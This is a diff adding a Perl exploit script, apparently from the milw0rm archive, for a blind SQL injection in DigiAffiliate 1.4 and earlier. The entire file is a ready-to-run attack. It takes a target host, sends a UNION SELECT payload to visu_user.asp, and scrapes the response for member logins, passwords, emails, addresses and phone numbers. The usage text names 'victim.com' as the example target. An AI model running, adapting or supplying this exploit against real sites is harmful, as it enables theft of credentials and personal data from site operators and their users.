@@ -1,0 +1,124 @@
+#!/usr/bin/perl
+#[Script Name: DigiAffiliate <= V1.4 Remote Blind SQL Injection Exploit
+#[Coded by   : ajann
+#[Author     : ajann
+#[Contact    : :(
+#[S.Page     : http://www.digiappz.com
+#[$$         : .299
+#[..         : ajann,Turkey
+
+use IO::Socket;
+if(@ARGV < 1){
+print "
+[========================================================================
+[//   DigiAffiliate <= V1.4 Remote Blind SQL Injection Exploit
+[//                   Usage: exploit.pl [target]
+[//                   Example: exploit.pl victim.com
+[//                   Example: exploit.pl victim.com
+[//                           Vuln&Exp : ajann
+[========================================================================
+";
+exit();
+}
+#Local variables
+$server = $ARGV[0];
+$server =~ s/(http:\/\/)//eg;
+$host = "http://".$server;
+$port = "80";
+$file = "/visu_user.asp?id=";
+
+print "Script <DIR> : ";
+$dir = <STDIN>;
+chop ($dir);
+
+if ($dir =~ /exit/){
+print "-- Exploit Failed[You Are Exited] \n";
+exit();
+}
+
+if ($dir =~ /\//){}
+else {
+print "-- Exploit Failed[No DIR] \n";
+exit();
+ }
+
+
+$target = "-1%20union%20select%200,login,password,name,email,0,fax,city,0,address1,address2,phone,0,0,0,0,city,0,0%20from%20members";
+$target = $host.$dir.$file.$target;
+
+#Writing data to socket
+print "+**********************************************************************+\n";
+print "+ Trying to connect: $server\n";
+$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
+print $socket "GET $target HTTP/1.1\n";
+print $socket "Host: $server\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+print "+ Connected!...\n";
+#Getting
+while($answer = <$socket>) {
+if ($answer =~ /name=\"login\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Exploit succeed! Getting admin information.\n";
+print "+ ---------------- +\n";
+print "+ Username: $1\n";
+}
+
+if ($answer =~ /name=\"password\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Password: $1\n";
+}
+
+if ($answer =~ /name=\"name\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Name: $1\n";
+}
+
+if ($answer =~ /name=\"email\" size=\"30\" class=\"gray_back\" value=\"(.*?)" onBlur/){
+print "+ Email: $1\n";
+}
+
+if ($answer =~ /name=\"address1\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Address1: $1\n";
+}
+
+if ($answer =~ /name=\"address2\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Address1: $1\n";
+}
+
+if ($answer =~ /name=\"city\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ City: $1\n";
+}
+
+if ($answer =~ /name=\"postcode\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ PostCode: $1\n";
+}
+
+if ($answer =~ /name=\"county\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Country: $1\n";
+}
+
+if ($answer =~ /name=\"phone\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Phone: $1\n";
+}
+
+if ($answer =~ /name=\"iurl\" size=\"24\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Fax: $1\n";
+}
+
+
+if ($answer =~ /name=\"title\" size=\"30\" class=\"gray_back\" value=\"(.*?)\">/){
+print "+ Country: $1\n";
+}
+
+if ($answer =~ /Syntax error/) { 
+print "+ Exploit Failed : ( \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+
+if ($answer =~ /Internal Server Error/) {
+print "+ Exploit Failed : (  \n";
+print "+**********************************************************************+\n";
+exit(); 
+}
+ }
+
+# milw0rm.com [2007-01-13]
